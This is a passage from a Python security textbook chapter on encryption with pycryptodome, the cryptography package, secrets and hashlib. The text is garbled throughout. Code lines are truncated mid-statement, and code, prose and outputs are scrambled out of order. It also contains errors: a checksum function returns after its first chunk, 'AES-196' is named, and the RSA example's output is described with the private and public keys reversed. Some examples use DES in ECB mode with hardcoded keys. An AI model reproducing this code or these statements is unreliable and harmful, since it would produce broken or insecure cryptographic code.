$ sudo python3 -m pip install pycryptodome 
We can use the Crypto.Cipher package to import a speciﬁc cipher
type:
from Crypto.Cipher import [Chiper_Type] 
The Crypto.Cipher package contains algorithms to protect data
conﬁdentiality. This package supports the following three types of
encryption algorithms:
Symmetric ciphers: All parties use the same key, to both
decrypt and encrypt data. Symmetric ciphers are usually very
fast and can process a large amount of data.
Asymmetric ciphers: Senders and receivers use diﬀerent keys.
Senders encrypt with public (not secret) keys while receivers
decrypt with private (secret) keys. Asymmetric ciphers are
typically very slow and can only process very small payloads.
Hybrid ciphers: The above two types of ciphers can be
combined in a construct that inherits the beneﬁts of both.

Asymmetric encryption is used to protect a short-lived
symmetric key, and symmetric encryption (under that key)
encrypts the actual message.
We can use the new method constructor to initialize the cipher:
new ([key], [mode], [Vector IV]) 
With this method, only the key is a mandatory parameter, and we
must consider whether the type of encryption requires that it has a
speciﬁc size. The possible modes are MODE_ECB, MODE_CBC,
MODE_CFB, MODE_PGP, MODE_OFB, MODE_CTR, and MODE_OPENPGP.
You can ﬁnd more information about these modes in the module
documentation:
https://pycryptodome.readthedocs.io/en/latest/src/ciphe
r/aes.html#Crypto.Cipher.AES.new.
If the MODE_CBC or MODE_CFB mode is used, the third parameter
(Vector IV) must be initialized, which allows the cipher to set the
initial value. Some ciphers may have optional parameters, such as
AES, which can specify the block and key size with the block_size
and key_size parameters.
This module provides support for hash functions with the use of the
Crypto.Hash submodule. You can import a speciﬁc hash type with
the following instruction, where hash_type is a value that can be
one of the hash functions supported out of MD5, SHA-1, and SHA-
256:
Crypto.Hash import [hash_type] 

We can use the MD5 hash function to obtain the checksum of a ﬁle.
You can ﬁnd the following code in the checksSumFile.py ﬁle
inside the pycryptodome folder:
In the preceding code, we are using the MD5 hash to obtain the
checksum of a ﬁle. We are using the update() method to set the
data we need in order to obtain the hash, and ﬁnally, we use the
hexdigest() method to generate the hash. We can see how hashing
is calculated in blocks or fragments of information; we are using
chunks, so it is a more eﬃcient technique from a memory point of
view. The output of the preceding script will be similar to the one
shown here:
from Crypto.Hash import MD5 
def get_file_checksum(filename): 
    hash = MD5.new() 
    chunk_size = 8191 
    with open(filename, 'rb') as file: 
        while True: 
            chunk = file.read(chunk_size) 
            if len(chunk) == 0: 
                break 
            hash.update(chunk) 
            return hash.hexdigest() 
print('The MD5 checksum is',get_file_checksum('check

We will continue to analyze diﬀerent encryption algorithms, for
example, the DES algorithm where the blocks have a length of eight
characters, which is often used when we want to encrypt and
decrypt with the same encryption key.
Encrypting and decrypting with the DES
algorithm
DES is a block cipher, which means that the text to be encrypted is a
multiple of eight, so you need to add spaces at the end of the text
you want to cipher to complete the eight characters. The operation of
the encryption API works as follows:
An instance of a cipher object is ﬁrst created by calling the new()
function from the corresponding cipher module using the following
syntax: Crypto.Cipher.DES.new(). The ﬁrst parameter is the
cryptographic key, and its length depends on the cipher we are
using. You can pass additional cipher- or mode-speciﬁc parameters
such as the operation mode.
To encrypt data, call the encrypt() method of the encryption object
with the plain text. The method returns the cipher text chunk.
Alternatively, with the output parameter, you can specify a pre-
allocated buﬀer for the output.
To decrypt data, we call the decrypt() method of the encryption
object with the ciphertext. The method returns the plain text snippet.
$ python checksSumFile.py 
The MD5 checksum is 477f570808d8cd31ee8b1fb83def73c4

The following script encrypts both a user and a message, simulates a
server receiving the credentials, and then displays the decrypted
data. You can ﬁnd the following code in the
DES_encrypt_decrypt.py ﬁle inside the pycryptodome folder:
The preceding script encrypts the data using DES, so the ﬁrst thing it
does is import the DES module and create a cipher object, where the
mycipher parameter value is the encryption key.
It is important to note that both the encryption and decryption keys
must have the same value. In our example, we are using the key
from Crypto.Cipher import DES 
# Fill with spaces the user until 8 characters 
user =  "user    ".encode("utf8") 
message = "message ".encode("utf8") 
key='mycipher'
# we create the cipher with DES 
cipher = DES.new(key.encode("utf8"),DES.MODE_ECB) 
# encrypt username and message 
cipher_user = cipher.encrypt(user) 
cipher_message = cipher.encrypt(message) 
print("Cipher User: " + str(cipher_user)) 
print("Cipher message: " + str(cipher_message)) 
# We simulate the server where the messages arrive e
cipher = DES.new(key.encode("utf8"),DES.MODE_ECB) 
decipher_user = cipher.decrypt(cipher_user) 
decipher_message = cipher.decrypt(cipher_message) 
print("Decipher user: " + str(decipher_user.decode()
print("Decipher Message: " + str(decipher_message.de

variable in both the encrypt and decrypt methods. This will be the
output of the preceding script:
$ python DES_encrypt_decrypt.py 
Cipher User: b'\xccO\xce\x11\x02\x80\xdb&' 
Cipher message: b'}\x93\xcb\\\x14\xde\x17\x8b' 
Decipher user: user     
Decipher Message: message 
Another interesting algorithm to analyze is AES, where the main
diﬀerence with respect to DES is that it oﬀers the possibility of
encrypting with diﬀerent key sizes.
Encrypting and decrypting with the AES
algorithm
Advanced Encryption Standard (AES) is a block encryption
algorithm adopted as an encryption standard in communications
today. The size of each block of the AES algorithm is 128 bits and the
key can be 128, 192, or 256 bits. AES-256 is the industry standard for
encryption and is used in enterprise, commercial, and public
contexts. Among the main encryption modes, we can highlight the
following:
Cipher-block chaining (CBC): In this mode, each block of plain
text is applied with an XOR operation with the previous cipher
block before being ciphered. In this way, each block of
ciphertext depends on all the plain text processed up to this
point. When working with this mode, we usually use an IV to
make each message unique.

Electronic Code Book (ECB): In this mode, the messages are
divided into blocks and each of them is encrypted separately
using the same key. The disadvantage of this method is that
identical blocks of plain text can correspond to blocks of
identical cipher text, so you can recognize these paĴerns and
discover the plain text from the cipher text. Hence, its use today
in applications as an encryption mode is not recommended.
Galois/Counter Mode (GCM): This is an operation mode used
in block ciphers with a block size of 128 bits. AES-GCM has
become very popular due to its good performance and being
able to take advantage of hardware acceleration enhancements
in processors. In addition, thanks to the use of the initialization
vector, we can randomize the generation of the keys to improve
the process of encrypting two messages with the same key.
To use an encryption algorithm such as AES, you need to import it
from the Crypto.Cipher.AES submodule. As the pycryptodome
block-level encryption API is very low-level, it only accepts 16-, 24-,
or 32-byte-long keys for AES-128, AES-196, and AES-256,
respectively. The longer the key, the stronger the encryption.
In this way, you need to ensure that the data is a multiple of 16 bytes
in length. Our AES key needs to be either 16, 24, or 32 bytes long,
and our IV needs to be 16 bytes long. It will be generated using the
random and string modules. You can ﬁnd the following code in
the pycryptodome_AES_CBC.py ﬁle inside the pycryptodome
folder:

The preceding script encrypts the data using AES, so the ﬁrst thing it
does is import the AES module. AES.new() represents the method
constructor for initializing the AES algorithm and takes three
parameters: the encryption key, encryption mode, and IV.
To encrypt a message, we use the encrypt() method on the plain
text message, and for decryption, we use the decrypt() method on
the cipher text.
from Crypto.Cipher import AES  
import binascii,os 
import random, string 
key = ''.join(random.choice(string.ascii_uppercase +
print('Key:',key) 
encryptor = AES.new(key.encode("utf8"), AES.MODE_CBC
decryptor = AES.new(key.encode("utf8"), AES.MODE_CBC
def aes_encrypt(plaintext): 
    ciphertext = encryptor.encrypt(plaintext) 
    return ciphertext 
def aes_decrypt(ciphertext): 
    plaintext = decryptor.decrypt(ciphertext) 
    return plaintext 
encrypted = aes_encrypt('This is the secret message 
decrypted = aes_decrypt(encrypted) 
print("Encrypted message :", encrypted) 
print("Decrypted message :", decrypted.decode()) 
$ python pycryptodome_AES_CBC.py 
Key: WqEMbj2ijcHAeZAZ 

We can improve the preceding script through the generation of the
initialization vector using the Random submodule and the generation
of the key through the PBKDF2 submodule, which allows the
generation of a random key from a random number called salt, the
size of the key, and the number of iterations. You can ﬁnd the
following code in the AES_encrypt_decrypt_PBKDF2.py ﬁle inside
the pycryptodome folder:
Encrypted message : b'\xc7\xe5E\x00\x0e\x88\x91\xe6\
Decrypted message : This is the secret message   
from Crypto.Cipher import AES 
from Crypto.Protocol.KDF import PBKDF2 
from Crypto import Random 
# key has to be 16, 24 or 32 bytes long 
key="secret-key-12345" 
iterations = 10000 
key_size = 16 
salt = Random.new().read(key_size) 
iv = Random.new().read(AES.block_size) 
derived_key = PBKDF2(key, salt, key_size, iterations
encrypt_AES = AES.new(derived_key, AES.MODE_CBC, iv)
# Fill with spaces the user until 32 characters 
message = "This is the secret message      ".encode(
ciphertext = encrypt_AES.encrypt(message) 
print("Cipher text: " , ciphertext) 
decrypt_AES = AES.new(derived_key, AES.MODE_CBC, iv)
message_decrypted =  decrypt_AES.decrypt(ciphertext)
print("Decrypted text: ",  message_decrypted.strip()

In the previous code, we are using the PBKDF2 algorithm to generate
a random key that we will use to encrypt and decrypt. The
ciphertext variable is the one that refers to the result of the
encrypted data, and message_decrypted refers to the result of the
decrypted data.
We can also see the PBKDF2 algorithm requires an alternate salt and
the number of iterations. The random salt value will prevent a brute-
force process against the key and should be stored together with the
password hash, recommending a salt value per password.
Regarding the number of iterations, a high number is recommended
to make the decryption process following a possible aĴack more
diﬃcult.
Another possibility oﬀered by the AES algorithm is the encryption of
ﬁles using data blocks, also known as fragments or chunks.
File encryption with AES
AES encryption requires that each block is a multiple of 16 bytes in
size. So, we read, encrypt, and write the data in chunks. The chunk
size is required to be a multiple of 16. The following script encrypts
and decrypts a ﬁle selected by the user.
You can ﬁnd the following code in the
AES_encrypt_decrypt_file.py ﬁle inside the pycryptodome
folder:
def encrypt_file(key, filename): 
    chunk_size = 64*1024 

In the preceding script, we are deﬁning the function that encrypts a
ﬁle using the AES algorithm. First, we initialize our initialization
vector and the AES encryption method. Then, we read the ﬁle using
blocks in multiples of 16 bytes, with the aim of encrypting the ﬁle
chunk by chunk.
For decryption, we need to reverse the preceding process in order to
decrypt the ﬁle using AES:
    output_filename = filename + '.encrypted' 
    # Random Initialization vector 
    iv = Random.new().read(AES.block_size) 
    #create the encryption cipher 
    encryptor = AES.new(key, AES.MODE_CBC, iv) 
    #Determine the size of the file 
    filesize = os.path.getsize(filename) 
    #Open the output file and write the size of the 
    #We use the struct package for the purpose. 
    with open(filename, 'rb') as inputfile: 
        with open(output_filename, 'wb') as outputfi
            outputfile.write(struct.pack('<Q', files
            outputfile.write(iv) 
            while True: 
                chunk = inputfile.read(chunk_size) 
                if len(chunk) == 0: 
                    break 
                elif len(chunk) % 16 != 0: 
                    chunk += bytes(' ','utf-8') * (1
                outputfile.write(encryptor.encrypt(c

In the preceding script, we are deﬁning the function that decrypts a
ﬁle using the AES algorithm. First, we open the encrypted ﬁle and
read the ﬁle size and the initialization vector. Then, we write the
decrypted data into a veriﬁcation ﬁle so that we can check the results
of the encryption.
The following code represents our main function, which oﬀers the
user the possibility of encrypting or decrypting the contents of a ﬁle:
def decrypt_file(key, filename): 
    chunk_size = 64*1024 
    output_filename = os.path.splitext(filename)[0] 
    #open the encrypted file and read the file size 
    #The IV is required for creating the cipher. 
    with open(filename, 'rb') as infile: 
        origsize = struct.unpack('<Q', infile.read(s
        iv = infile.read(16) 
        #create the cipher using the key and the IV.
        decryptor = AES.new(key, AES.MODE_CBC, iv) 
        #We also write the decrypted data to a verif
        #so we can check the results of the encrypti
        #and decryption by comparing with the origin
        with open(output_filename, 'wb') as outfile
            while True: 
                chunk = infile.read(chunk_size) 
                if len(chunk) == 0: 
                    break 
                outfile.write(decryptor.decrypt(chun
            outfile.truncate(origsize) 

This will be the output of the preceding script, where we have
options to encrypt and decrypt a ﬁle entered by the user:
$ python AES_encrypt_decrypt_file.py 
do you want to (E)ncrypt or (D)ecrypt?: E 
file to encrypt: file.txt 
password: 
done. 
The output of the preceding script when the user is encrypting a ﬁle
will result in a ﬁle called file.txt.encrypted, which contains the
import getpass 
def main(): 
    choice = input("do you want to (E)ncrypt or (D)e
    if choice == 'E': 
        filename = input('file to encrypt: ') 
        password = getpass.getpass() 
        encrypt_file(getKey(password.encode("utf8"))
        print('done.') 
    elif choice == 'D': 
        filename = input('file to decrypt: ') 
        password = getpass.getpass() 
        decrypt_file(getKey(password.encode("utf8"))
        print('done.') 
    else: 
        print('no option selected.') 
if __name__ == "__main__": 
    main() 

same content as the original ﬁle, but the information is not legible.
We’ll continue to analyze diﬀerent encryption algorithms, for
example, the RSA algorithm, which uses an asymmetric public key
scheme for encryption and decryption.
Generating RSA signatures using
pycryptodome
RSA is a public key cryptographic system developed in 1979 that is
widely used to secure data transmission. Asymmetric cryptography
has two main use cases: authentication and conﬁdentiality.
When using asymmetric cryptography, messages can be signed with
a private key, and then anyone with the public key can verify that
the message was created by someone who possesses the
corresponding private key. This can be combined with an identity-
prooﬁng system to ﬁnd out which entity holds that private key,
providing authentication.
The advantage of asymmetric or public key cryptography is that it
also provides a method to ensure that the message is not altered and
is authentic. In the case of data signatures, the sender uses their
private key to sign the data and the receiver uses the sender’s public
key to verify it.
In the following example, we are encrypting and decrypting using
the RSA algorithm through the public and private keys. You can ﬁnd
the following code in the RSA_generate_pair_keys.py ﬁle inside
the pycryptodome folder:

from Crypto.PublicKey import RSA 
from Crypto.Cipher import PKCS1_OAEP 
from Crypto.Hash import SHA256 
from Crypto.Signature import PKCS1_v1_5 
def generate(bit_size): 
    keys = RSA.generate(bit_size) 
    return keys 
def encrypt(public_key, data): 
    cipher = PKCS1_OAEP.new(public_key) 
    return cipher.encrypt(data) 
def decrypt(private_key, data): 
    cipher = PKCS1_OAEP.new(private_key) 
    return cipher.decrypt(data) 
if __name__ == "__main__": 
    keys = generate(2048) 
The ﬁrst step in applying RSA is to generate the public and private
key pair. In the preceding code, we are generating the key pair using
the generate() method, passing the key size as a parameter. It is
recommended to have a length of at least 2048 bits.
Next, we export the public key using the publickey() method and
use the decode() method to export the public key in UTF-8 format.
PEM is a text-based encoding type that is often used if you want to
share by means of a service such as email:
    print("Public key:") 
    print(keys.publickey().export_key('PEM').decode(
    with open("public.key",'wb') as file: 
        file.write(keys.publickey().export_key()) 

We can use RSA to create a message signature. A valid signature can
only be generated with access to the private RSA key, so validation is
possible with the corresponding public key:
In the preceding code, we are executing a signature veriﬁcation that
works with the public key. Finally, we use the public key to encrypt
the data and the private key to decrypt the data:
    print("Private Key:") 
    print(keys.export_key('PEM').decode()) 
    with open("private.key",'wb') as file: 
        file.write(keys.export_key('PEM')) 
    text2cipher = "text2cipher".encode("utf8") 
    hasher = SHA256.new(text2cipher) 
    signer = PKCS1_v1_5.new(keys) 
    signature = signer.sign(hasher) 
    verifier = PKCS1_v1_5.new(keys) 
    if verifier.verify(hasher, signature): 
        print('The signature is valid!') 
    else: 
        print('The message was signed with the wrong
    encrypted_data = encrypt(keys.publickey(),text2c
    print("Text encrypted:",encrypted_data) 
    decrypted_data = decrypt(keys,encrypted_data) 
    print("Text Decrypted:",decrypted_data.decode())

This will be the output of the previous script where we are
generating the public and private keys:
In the preceding output, we can see the generation of public and
private keys with RSA and the validation of the signature.
In the following example, we are using asymmetric cryptography to
generate public and private keys, and for encryption and decryption,
$ python RSA_generate_pair_keys.py 
Public key: 
-----BEGIN PUBLIC KEY----- 
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ 8AMIIBCgKCAQEAxYLEDHf
D3j96KFL4iQp0IfQ68nCHlacaZORc4dWTBrLsKtyk1oqyfPqN0Kd
nqYozmwCTm+6VhskmvKqtP2z4Si1X1vqB56/FKWKU0H8aaLAvuTq
ZdI0WtT8lkjYjJqzchf9iXlkPJIEw6S HH0rr0fukyms10AowafS
5YWiOqWwoOmN5sRuvNHj4IWS0QURsZixL Tb0bfsAzAgluQyc+fY
v8ED8nRPNozt9qZn9kSn+4pd6w0JYWxXwGfIKiT9EQ/vP/fioOld
dQIDAQAB 
-----END PUBLIC KEY----- 
Private Key: 
-----BEGIN RSA PRIVATE KEY----- 
MIIEowIBAAKCAQEAxYLEDHfAoqZj8i3k8 5pQD3j96KFL4iQp0If
c4dWTBrLsKtyk1oqyfPqN0KdrE/a3TXecG2unqYozmwCTm+6Vhsk
… 
-----END RSA PRIVATE KEY----- 
The signature is valid! 
Text encrypted: 
b"\x1c\x13\xf5\xf3\x9e\xa3\xcc\xfa\xb9\xaf\x80($\x0b
Text Decrypted: text2cipher 

we are using the PKCS1_OAEP package from the Crypto.PublicKey
module. You can ﬁnd the following code in the
pycryptodome_RSA.py ﬁle inside the pycryptodome folder:
from Crypto.Cipher import PKCS1_OAEP 
from Crypto.PublicKey import RSA 
import sys 
bit_size = int(sys.argv[1]) 
key_format = sys.argv[2] 
message = sys.argv[3] 
key = RSA.generate(bit_size) 
print("Generating Public Key....") 
publicKey = key.publickey().exportKey(key_format) 
print("Generating Private Key....") 
privateKey = key.exportKey(key_format) 
message = str.encode(message) 
RSApublicKey = RSA.importKey(publicKey) 
OAEP_cipher = PKCS1_OAEP.new(RSApublicKey) 
encryptedMsg = OAEP_cipher.encrypt(message) 
print('Encrypted text:', encryptedMsg) 
RSAprivateKey = RSA.importKey(privateKey) 
OAEP_cipher = PKCS1_OAEP.new(RSAprivateKey) 
decryptedMsg = OAEP_cipher.decrypt(encryptedMsg) 
print('The original text:', decryptedMsg.decode()) 
In the previous code, we are applying encryption and decryption
using Python’s PKCS1_OAEP package, which is an optimal
asymmetric cipher padding scheme published by RSA and is more
secure than the simple primitive RSA cipher.

To execute the OAEP scheme, we will ﬁrst have to generate the
PKCS1OAEP_Cipher object and then call the
PKCS1OAEP_Cipher.encrypt() and
PKCS1OAEP_Cipher.decrypt() methods to encrypt or decrypt the
text using this scheme. If the input text is a string type, we will ﬁrst
need to convert it into a byte string.
These results will be the output of the previous script where we are
generating the public and private keys, encrypting the message with
the private key, and decrypting the message with the public key.
To execute the previous script, we need to pass the size of the key as
the ﬁrst parameter, for example, 2,048 bits, and the ﬁle format for the
public and private keys as the second parameter. The third
parameter corresponds to the message to encrypt.
Now that we have reviewed the pycryptodome module, we are
going to analyze the cryptography module as an alternative for
encrypting and decrypting data.
Encrypting and decrypting
information with cryptography
$ python pycryptodome_RSA.py 2048 PEM "this is the s
Generating Public Key.... 
Generating Private Key.... 
Encrypted text: b't\x8c\x99du7\xdb\xea\xbbB\xd2\xdc\
The original text: this is the secret message 

In this section, we will review the cryptography module for
encrypting and decrypting data, with algorithms such as AES.
Introduction to the cryptography
module
The cryptography (https://pypi.org/project/cryptography)
Python module is available in the PyPI repository. Use pip to install
it:
$ pip install cryptography 
The main advantage that cryptography provides over other
cryptography modules such as pycryptodome is that it oﬀers
superior performance when it comes to performing cryptographic
operations.
This module includes both high-level and low-level interfaces for
common cryptographic algorithms, such as symmetric ciphers,
message digests, and key-derivation functions. For example, we can
use symmetric encryption with the fernet package.
Symmetric encryption with the fernet
package
cryptography is a Python package that can be used to achieve
symmetric key encryption. Symmetric key encryption means we use
the same key for the encryption and decryption process.

Symmetric key encryption is a simple way to encrypt a string. The
only drawback is that it is comparatively less secure; thus anyone
with access to the key can read the ciphertext.
Fernet is an implementation of symmetric encryption and
guarantees that an encrypted message cannot be manipulated or
read without the key. For more information about this class, please
refer to the oﬃcial documentation:
https://cryptography.io/en/latest/fernet.
To generate the key, we can use the generate_key() method from
the Fernet interface. The following code uses the cryptography
package functions to encrypt a string in Python. You can ﬁnd the
following code in the encrypt_decrypt_message.py ﬁle inside the
cryptography folder:
from cryptography.fernet import Fernet 
key = Fernet.generate_key() 
cipher_suite = Fernet(key) 
print("Key "+str(cipher_suite)) 
message = "Secret message".encode("utf8") 
cipher_text = cipher_suite.encrypt(message) 
plain_text = cipher_suite.decrypt(cipher_text) 
print("Cipher text: "+str(cipher_text.decode())) 
print("Plain text: "+str(plain_text.decode())) 
This is the output of the preceding script:
$ python encrypt_decrypt_message.py 
Key <cryptography.fernet.Fernet object at 0x7f29a2bf

In the previous code, we import Fernet from the
cryptography.fernet module. Next, we generate an encryption
key that will be used for both encryption and decryption. The
Fernet class is instantiated with the encryption key and the string is
encrypted by creating an instance of this class. Finally, it is
decrypted by using the instance of the Fernet class.
We can improve the preceding script by adding the possibility of
saving the key in a ﬁle to use this key for both the encryption and
decryption functions. For this task, we need to import the Fernet
class and start generating a key that is required for symmetric
encryption/decryption. You can ﬁnd the following code in the
encrypt_decrypt_message_secret_key.py ﬁle inside the
cryptography folder:
from cryptography.fernet import Fernet 
def generate_key(): 
    key = Fernet.generate_key() 
    with open("secret.key", "wb") as key_file: 
        key_file.write(key) 
def load_key(): 
    return open("secret.key", "rb").read() 
In the preceding code, we are deﬁning the generate_key()
function, which generates a key and saves it to the secret.key ﬁle.
Cipher text: gAAAAABfcglbXHiFG4VIGuH7tnI4dwXBMTi22Tm
Plain text: Secret message 

The second function, load_key(), reads the previously generated
key from the secret.key ﬁle:
In the preceding code, we are deﬁning the encrypt_message()
function, which encrypts a message passed as a parameter using the
Fernet object and the encrypt() method from that object.
The second function decrypts an encrypted message. To decrypt the
message, we just call the decrypt() method from the Fernet
object.
The main program just calls the previous functions with a
hardcoded message to test the encrypt and decrypt methods.
def encrypt_message(message): 
    key = load_key() 
    encoded_message = message.encode() 
    fernet = Fernet(key) 
    encrypted_message = fernet.encrypt(encoded_messa
    return encrypted_message 
def decrypt_message(encrypted_message): 
    key = load_key() 
    fernet = Fernet(key) 
    decrypted_message = fernet.decrypt(encrypted_mes
    return decrypted_message.decode() 

We can use the previously generated secret.key ﬁle to encrypt the
content of a ﬁle called file.txt into a file_encrypted.txt.
Using the same key, we could decrypt the content of this ﬁle. You
can ﬁnd the following code in the
encrypt_decrypt_content_file.py ﬁle inside the cryptography
folder:
from cryptography.fernet import Fernet 
import os  
def load_key(): 
    return open("secret.key", "rb").read() 
def encrypt_file(file, key): 
    i = Fernet(key) 
    with open(file, "rb") as myfile: 
        file_data = myfile.read() 
        data = i.encrypt(file_data) 
        print("Data encrypted:",data.decode()) 
    with open("file_encrypted.txt", "wb") as file: 
if __name__ == "__main__": 
    generate_key() 
    message_encrypted = encrypt_message("encrypt thi
    print('Message encrypted:', message_encrypted) 
    print('Message decrypted:',decrypt_message(messa
$ python encrypt_decrypt_message_secret_key.py 
Message encrypted: b'gAAAAABfchiQjdvMaoChmmIYE4_IgpN
Message decrypted: encrypt this message 

        file.write(data) 
def decrypt_file(file_encrypted, key): 
    i = Fernet(key) 
    with open(file_encrypted, "rb") as myfile: 
        file_data = myfile.read() 
        data = i.decrypt(file_data) 
        print("Data decrypted:",data.decode()) 
if __name__ == '__main__': 
    file = 'file.txt' 
    file_encrypted = 'file_encrypted.txt' 
    key = load_key() 
    encrypt_file(file, key) 
    decrypt_file(file_encrypted, key) 
When executing the previous script, we can see how a new ﬁle is
generated with the encrypted content from file.txt.
Another way of using Fernet is to pass a key in the init parameter
constructor. This key can be derived from a password using an
algorithm called PBKDF2, which provides functionality to generate
the password through a key derivation function.
Encryption with the PBKDF2 submodule
$ python encrypt_decrypt_content_file.py 
Data encrypted: gAAAAABkNHgLoKFufI0WXKPjI_zPQ-_mnOwW
Data decrypted: file content 

Password-Based Key Derivation Function 2 (PBKDF2) is typically
used to derive a cryptographic key from a password. More
information about key derivation functions can be found at
https://cryptography.io/en/latest/hazmat/primitives/key
-derivation-functions.
In the following example, we are using this function to generate a
key from a password, and we use that key to create the Fernet
object we will use for encrypting and decrypting the data.
In the process of encrypting and decrypting, we can use the Fernet
object we have initialized with the key generated using the
PBKDF2HMAC submodule. You can ﬁnd the following code in the
encrypt_decrypt_PBKDF2HMAC.py ﬁle inside the cryptography
folder:
from cryptography.fernet import Fernet 
from cryptography.hazmat.backends import default_bac
from cryptography.hazmat.primitives import hashes 
from cryptography.hazmat.primitives.kdf.pbkdf2 impor
import base64 
import os 
password = "password".encode("utf8") 
salt = os.urandom(16) 
pbkdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=
key = pbkdf.derive(password) 
pbkdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=
pbkdf.verify(password, key) 
key = base64.urlsafe_b64encode(key) 
fernet = Fernet(key) 
token = fernet.encrypt("Secret message".encode("utf8

In the preceding code, we are using the PBKDF2HMAC submodule to
generate a key from a password. We are using the verify() method
from the pbkdf object, which checks whether deriving a new key
from the supplied key generates the same key and raises an
exception if they do not match.
Symmetric encryption with the ciphers
package
The ciphers package from the cryptography module provides a
class for symmetric encryption with the
cryptography.hazmat.primitives.ciphers.Cipher class.
Cipher objects combine an algorithm such as AES with a mode,
such as CBC or CTR.
In the following script, we can see an example of encrypting and
then decrypting content with the AES algorithm. You can ﬁnd the
following code in the encrypt_decrypt_AES.py ﬁle inside the
cryptography folder:
print("Token: "+str(token)) 
print("Message: "+str(fernet.decrypt(token).decode()
import os 
from cryptography.hazmat.primitives.ciphers import C
from cryptography.hazmat.backends import default_bac
backend = default_backend() 
key = os.urandom(32) 
iv = os.urandom(16) 

In the preceding code, we are generating a cipher object using the
AES algorithm with a randomly generated key and CBC mode.
In the preceding output, we can see the generated cipher object
used to encrypt and decrypt the secret message.
In the following script, we can see an example of encrypting and
then decrypting content with ﬁles that contain private and public
keys. You can ﬁnd the following code in the
cipher_with_private_key.py ﬁle inside the cryptography
folder:
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), 
encryptor = cipher.encryptor() 
print(encryptor) 
message_encrypted = encryptor.update("a secret messa
print("Cipher text: "+str(message_encrypted)) 
cipher_text =  message_encrypted + encryptor.finaliz
decryptor = cipher.decryptor() 
print("Plain text: "+str(decryptor.update(cipher_tex
$ python encrypt_decrypt_AES.py 
<cryptography.hazmat.primitives.ciphers.base._Cipher
Cipher text: b'&;\x91b\xb3\xd7]\x88U[\x1e\xf6j\xf4h\
Plain text: a secret message 
from cryptography.hazmat.primitives import hashes 
from cryptography.hazmat.primitives.asymmetric impor
from cryptography.hazmat.primitives import serializa

After analyzing the possibilities oﬀered by the cryptography
module, we’ll continue with another means of performing
cryptography, such as steganography, and what Python oﬀers in this
respect.
Now that you have learned how to hide content inside an image
with steganography, you will learn how to generate keys and
passwords securely with the secrets and hashlib modules.
from cryptography.hazmat.backends import default_bac
plaintext = b'a secret message' 
padding_config = padding.OAEP(mgf=padding.MGF1(algor
with open('private_key.pem', 'rb') as private_key: 
    private_key = serialization.load_pem_private_key
with open('public_key.pem', 'rb') as public_key: 
    public_key = serialization.load_pem_public_key(p
ciphertext_with_public_key = public_key.encrypt(plai
decrypted_with_private_key = private_key.decrypt(cip
print("Encrypted message:",ciphertext_with_public_ke
print("Decrypted message:",decrypted_with_private_ke
print("Plain text:",plaintext.decode()) 
print(decrypted_with_private_key == plaintext) 
$ python cipher_with_private_key.py 
Encrypted message: b"\xab\x14o\xd3\xc3JJ@G\x07V~\x96
Decrypted message: b'a secret message' 
Plain text: a secret message 
True 

Generating keys securely with the
secrets and hashlib modules
In this section, we are going to review the main modules Python
provides for generating keys and passwords in a secure way.
Generating keys securely with the
secrets module
The secrets module is used to generate cryptographically strong
random numbers, suitable for managing data such as passwords,
user authentication, security tokens, and related secrets.
In general, the use of random numbers is common in various
scientiﬁc computing applications and cryptographic applications.
With the help of the secrets module, we can generate reliable
random data that can be used by cryptographic operations.
The secrets module derives its implementation from the
os.urandom() and SystemRandom() methods, which interact with
the operating system to ensure cryptographic randomness and can
help you accomplish the following tasks:
Generate random tokens for security applications.
Create strong passwords.
Generate tokens for secure URLs.
The following instructions generate a random number in
hexadecimal format:

>>> import secrets 
>>> secrets.token_hex(20) 
'ccaf5c9a22e854856d0c5b1b96c81e851bafb288' 
The secrets module allows us to generate a random and secure
password to use as a token or encryption key. In the following
example, we are generating a random and cryptographically secure
password. You can ﬁnd the following code in the
generate_password.py ﬁle inside the secrets folder:
In the previous code, we are using the string module, which
contains some constants that represent the lowercase alphabet
located in ascii_letters, uppercase located in ascii_uppercase,
and digits in digits. Knowing this, we can concatenate these values
and create a string that will have these characters concatenated.
We deﬁne a length, and the important part is where we use the join
function, which joins an empty string '' with a character that is
chosen from a range determined by the length speciﬁed, choosing a
random character 16 times.
from secrets import choice 
from string import ascii_letters, ascii_uppercase, d
characters = ascii_letters + ascii_uppercase + digit
length = 16 
random_password= ''.join(choice(characters) for char
print("The password generated is:", random_password)

The following can be the execution of the previous script, where we
are generating a password of 16 characters in length combining
characters and numbers:
$ python generate_password.py 
The password generated is: VYiRK2ZVoxOC3HJm 
In the following example, we create a 16-character long
alphanumeric password with each of the following requirements: a
single lowercase leĴer, an uppercase character, a digit, and a special
character. You can ﬁnd the following code in the
generate_secure_url.py ﬁle inside the secrets folder:
import secrets 
import string 
def generateSecureURL(): 
    src = string.ascii_letters + string.digits + str
    password = secrets.choice(string.ascii_lowercase
    password += secrets.choice(string.ascii_uppercas
    password += secrets.choice(string.digits) 
    password += secrets.choice(string.punctuation) 
    for i in range (16): 
        password += secrets.choice(src) 
    print ("Strong password:", password) 
    secureURL = "https://www.domain.com/auth/reset="
    secureURL += secrets.token_urlsafe(16) 
    print("Token secure URL:", secureURL) 
if __name__ == "__main__": 
    generateSecureURL() 

In the preceding code, we are generating a token-secure URL using
the token_urlsafe() method, which provides a secure text string
for URLs with a speciﬁc length. This can be the execution of the
preceding script, where we are generating a password and a token-
secure URL:
We’ll continue by analyzing the hashlib module
(https://docs.python.org/3.10/library/hashlib.html) for
diﬀerent tasks related to generating secure passwords and checking
the hash of a ﬁle.
Generating keys securely with the
hashlib module
Currently, any project that requires the storage of a user’s data
makes use of one or multiple algorithms to carry out encryption,
which allows certain information to be hidden or protected. On most
sites that require registration, passwords are encrypted, and a hash
(the result) is stored instead of the original text.
The hashlib module allows us to obtain the hash of a password in a
secure way and helps us to make a hash aĴack diﬃcult to carry out.
You can ﬁnd the following code in the hash_password.py ﬁle
inside the hashlib folder:
$ python generate_secure_url.py 
Strong password: sT5\Dv3lR{Efl{o]Uk<v 
Token secure URL: https://www.domain.com/auth/reset=

import hashlib 
password = input("Password:") 
hash_password = hashlib.sha512(password.encode()) 
print("The hash password is:") 
print(hash_password.hexdigest()) 
The preceding code creates a password in SHA-512 format. The
input is converted into a string and the hashlib.sha512() method
is called to hash the string. Finally, the hash is obtained using the
hexdigest() method. The following can be the execution of the
preceding script where we are generating a hash with the SHA-512
algorithm:
We can improve the preceding example by adding a salt to the
